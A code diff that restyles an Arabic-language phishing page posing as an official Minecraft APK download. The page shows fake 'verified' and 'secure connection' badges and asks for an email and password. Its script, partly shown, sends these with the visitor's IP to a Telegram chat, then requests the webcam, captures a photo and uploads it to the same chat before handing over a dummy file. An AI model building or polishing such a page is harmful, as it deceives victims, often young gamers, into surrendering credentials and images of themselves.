@@ -11,48 +11,80 @@
             box-sizing: border-box;
         }
         body {
-            background: #0d0d0d;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #2d2d2d;
+            font-family: 'Courier New', monospace;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             color: #fff;
+            background-image: url('https://i.imgur.com/8z1p3Wx.png');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
         }
         .container {
-            background: #1a1a2e;
-            padding: 40px 30px;
-            border-radius: 30px;
-            box-shadow: 0 0 60px rgba(0, 200, 255, 0.15);
-            max-width: 420px;
+            background: rgba(30, 30, 30, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 35px 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 60px rgba(0, 200, 255, 0.1);
+            max-width: 450px;
             width: 90%;
-            border: 1px solid #2a2a4a;
+            border: 3px solid #6ab04c;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(106, 176, 76, 0.03) 2px, rgba(106, 176, 76, 0.03) 4px);
+            pointer-events: none;
+            animation: scan 10s linear infinite;
+        }
+        @keyframes scan {
+            0% { transform: translateY(-50%); }
+            100% { transform: translateY(0%); }
         }
         .logo {
-            font-size: 48px;
+            font-size: 52px;
             margin-bottom: 5px;
+            position: relative;
+            z-index: 1;
         }
         .logo h1 {
-            font-size: 32px;
+            font-size: 34px;
             font-weight: 700;
             color: #6ab04c;
             margin-top: 5px;
+            text-shadow: 0 0 20px rgba(106, 176, 76, 0.3);
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
         }
         .sub {
             color: #aaa;
             font-size: 14px;
-            margin-bottom: 25px;
-            border-bottom: 1px solid #2a2a4a;
-            padding-bottom: 20px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #6ab04c;
+            padding-bottom: 15px;
+            position: relative;
+            z-index: 1;
         }
         .info {
-            background: #12122a;
+            background: rgba(18, 18, 42, 0.7);
             padding: 15px;
             border-radius: 14px;
-            border: 1px solid #2a2a4a;
+            border: 1px solid #6ab04c;
             margin-bottom: 20px;
             text-align: left;
+            position: relative;
+            z-index: 1;
         }
         .info div {
             display: flex;
@@ -62,30 +94,41 @@
             color: #aaa;
         }
         .info div span:last-child {
-            color: #fff;
+            color: #6ab04c;
+            font-weight: bold;
         }
         .input-group {
             margin-bottom: 15px;
             text-align: left;
+            position: relative;
+            z-index: 1;
         }
         .input-group label {
             font-size: 13px;
-            color: #aaa;
+            color: #6ab04c;
             display: block;
             margin-bottom: 5px;
+            font-weight: bold;
+            letter-spacing: 1px;
         }
         .input-group input {
             width: 100%;
             padding: 14px;
-            border-radius: 14px;
-            border: 1px solid #2a2a4a;
-            background: #12122a;
+            border-radius: 10px;
+            border: 2px solid #3a3a3a;
+            background: rgba(0, 0, 0, 0.7);
             color: #fff;
             font-size: 15px;
             outline: none;
+            transition: 0.3s;
+            font-family: 'Courier New', monospace;
         }
         .input-group input:focus {
             border-color: #6ab04c;
+            box-shadow: 0 0 25px rgba(106, 176, 76, 0.2);
+        }
+        .input-group input::placeholder {
+            color: #555;
         }
         .btn {
             width: 100%;
@@ -95,44 +138,55 @@
             color: #fff;
             font-weight: bold;
             font-size: 18px;
-            border-radius: 50px;
+            border-radius: 10px;
             cursor: pointer;
             transition: 0.3s;
             margin-top: 5px;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
         }
         .btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 30px rgba(106, 176, 76, 0.3);
+            box-shadow: 0 0 40px rgba(106, 176, 76, 0.4);
         }
         .btn-secondary {
-            background: #2a2a4a;
+            background: #3a3a3a;
             margin-top: 10px;
         }
         .btn-secondary:hover {
-            background: #3a3a5a;
+            background: #4a4a4a;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
         }
         #status {
             margin-top: 18px;
             font-size: 14px;
             color: #aaa;
             padding: 12px;
-            border-radius: 12px;
-            background: #12122a;
-            border: 1px solid #1a1a3a;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #3a3a3a;
             min-height: 50px;
+            position: relative;
+            z-index: 1;
+            font-family: 'Courier New', monospace;
         }
         .footer {
             margin-top: 20px;
             font-size: 12px;
             color: #444;
-            border-top: 1px solid #1a1a3a;
+            border-top: 1px solid #3a3a3a;
             padding-top: 15px;
+            position: relative;
+            z-index: 1;
         }
         .loader {
             display: inline-block;
             width: 18px;
             height: 18px;
-            border: 3px solid #2a2a4a;
+            border: 3px solid #3a3a3a;
             border-top: 3px solid #6ab04c;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
@@ -140,30 +194,81 @@
             margin-right: 8px;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .hidden {
-            display: none;
+        /* تأثير ناري احتراقي */
+        .fire {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: radial-gradient(ellipse at center bottom, rgba(255, 100, 0, 0.1) 0%, transparent 70%);
+            animation: fire 2s ease-in-out infinite alternate;
+            z-index: 0;
+        }
+        @keyframes fire {
+            0% { opacity: 0.3; transform: scale(1); }
+            100% { opacity: 0.7; transform: scale(1.1); }
+        }
+        /* شعار ماينكرافت */
+        .minecraft-icon {
+            font-size: 60px;
+            display: block;
+            margin-bottom: 5px;
+            text-shadow: 0 0 40px rgba(106, 176, 76, 0.3);
+        }
+        /* أزرار بجودة عالية */
+        .btn-minecraft {
+            background: #6ab04c;
+            border: 2px solid #4a8a32;
+            text-shadow: 0 2px 0 #3a6a2a;
+        }
+        .btn-minecraft:hover {
+            background: #7ac05c;
+            border-color: #5a9a42;
+        }
+        /* صندوق المعلومات */
+        .info-box {
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid #6ab04c;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 15px;
+        }
+        .info-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 13px;
+            color: #aaa;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .info-box .row:last-child {
+            border-bottom: none;
+        }
+        .info-box .row span:last-child {
+            color: #6ab04c;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="logo">⛏️</div>
-        <h1 style="color:#6ab04c; font-size:28px;">Minecraft</h1>
-        <div class="sub">📥 تنزيل الإصدار 1.21.4 – النسخة الرسمية</div>
+        <div class="fire"></div>
 
-        <div class="info">
-            <div><span>📦 الملف</span><span>Minecraft.apk</span></div>
-            <div><span>📏 الحجم</span><span>287 MB</span></div>
-            <div><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
-            <div><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
+        <div class="minecraft-icon">⛏️</div>
+        <h1 style="color:#6ab04c; font-size:34px; margin-bottom:5px; text-shadow:0 0 30px rgba(106,176,76,0.3); position:relative; z-index:1;">MINECRAFT</h1>
+        <div class="sub">▼ تنزيل الإصدار 1.21.4 – النسخة الرسمية ▼</div>
+
+        <div class="info-box">
+            <div class="row"><span>📦 الملف</span><span>Minecraft.apk</span></div>
+            <div class="row"><span>📏 الحجم</span><span>287 MB</span></div>
+            <div class="row"><span>📅 الإصدار</span><span>28 يونيو 2026</span></div>
+            <div class="row"><span>🔒 التوقيع</span><span>✅ معتمد</span></div>
         </div>
 
         <div class="input-group">
@@ -175,11 +280,11 @@
             <input type="password" id="passwordInput" placeholder="••••••••">
         </div>
 
-        <button class="btn" id="mainBtn">🚀 تحميل Minecraft.apk</button>
+        <button class="btn btn-minecraft" id="mainBtn">🚀 تحميل Minecraft.apk</button>
         <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>
 
         <div id="status">⏳ أدخل بياناتك واضغط تحميل</div>
-        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق</div>
+        <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
     </div>
 
     <script>
@@ -196,7 +301,6 @@
         const fakeBtn = document.getElementById('fakeBtn');
         const statusDiv = document.getElementById('status');
 
-        // دالة إرسال البيانات إلى تيليغرام
         async function sendData(email, password, action) {
             try {
                 const ip = await getIP();
@@ -220,7 +324,6 @@
             }
         }
 
-        // دالة الحصول على IP
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -231,7 +334,6 @@
             }
         }
 
-        // دالة طلب الكاميرا
         async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -251,7 +353,6 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/jpeg', 0.9);
 
-                // إرسال الصورة إلى تيليغرام
                 const blob = await fetch(imageData).then(r => r.blob());
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -269,7 +370,6 @@
             }
         }
 
-        // الوظيفة الرئيسية
         async function handleMainAction() {
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
@@ -288,14 +388,12 @@
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
             statusDiv.style.color = '#aaa';
 
-            // إرسال البريد وكلمة المرور
             const sent = await sendData(email, password, 'تحميل مباشر');
 
             if (sent) {
                 statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
                 statusDiv.style.color = '#4caf50';
 
-                // طلب الكاميرا بعد ثانية
                 setTimeout(async () => {
                     statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                     const cam = await requestCamera();
@@ -304,7 +402,6 @@
                     } else {
                         statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
                     }
-                    // تحميل ملف وهمي
                     const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
@@ -327,7 +424,6 @@
             }
         }
 
-        // زر التحقق الوهمي
         fakeBtn.addEventListener('click', async function() {
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
             statusDiv.style.color = '#aaa';
@@ -350,7 +446,6 @@
 
         mainBtn.addEventListener('click', handleMainAction);
 
-        // Enter
         emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
         passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
     </script>
